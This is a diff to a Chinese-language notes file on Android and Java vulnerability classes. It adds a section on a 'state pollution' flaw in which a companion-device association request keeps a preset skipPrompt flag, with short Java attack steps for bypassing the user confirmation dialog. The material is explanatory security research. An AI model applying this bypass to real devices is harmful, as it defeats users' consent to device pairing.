@@ -59,7 +59,7 @@ func Privilege (A a){
   
 
 
-2 java/安卓序列化/反序列化漏洞
+2、java/安卓序列化/反序列化漏洞
 	java/安卓中存在多种能够反序列化的类，如果这些类的反序列化函数或者序列化函数中有敏感动作，如给予类特权，读取写入任意信息、执行任意代码、构造可控输入等，攻击者就可以通过序列化或者反序列化来进行提权或者其他恶意操作。
 
 class a{
@@ -87,6 +87,39 @@ class a{
   
   }
 
+3、状态污染漏洞状态污染漏洞
+
+java
+if (mayAssociateWithoutPrompt(callingPackage, userId)) {
+    Slog.i(LOG_TAG, "setSkipPrompt(true)");
+    request.setSkipPrompt(true);  // 只在条件为true时设置
+}
+// 没有else分支来重置skipPrompt状态！
+
+攻击步骤
+构造恶意AssociationRequest对象：
+java
+// 攻击者预先构造的恶意request
+AssociationRequest maliciousRequest = new AssociationRequest.Builder()
+    .setSingleDevice(true)
+    .build();
+
+// 通过反射或其他方式设置skipPrompt为true
+maliciousRequest.setSkipPrompt(true);  // 恶意预设状态
+绕过授权检查：
+java
+
+// 当攻击者调用associate方法时：
+associate(maliciousRequest, callback, attackerPackage);
+
+// 即使mayAssociateWithoutPrompt(attackerPackage, userId)返回false
+// 代码也不会执行setSkipPrompt(true)
+// 但更关键的是，也不会执行setSkipPrompt(false)来重置状态！
+利用污染状态：
+java
 
 
-
+// 在后续的设备发现流程中：
+service.startDiscovery(request, callingPackage, callback, future);
+// request对象仍然保持skipPrompt=true的状态
+// 系统可能会跳过用户确认对话框
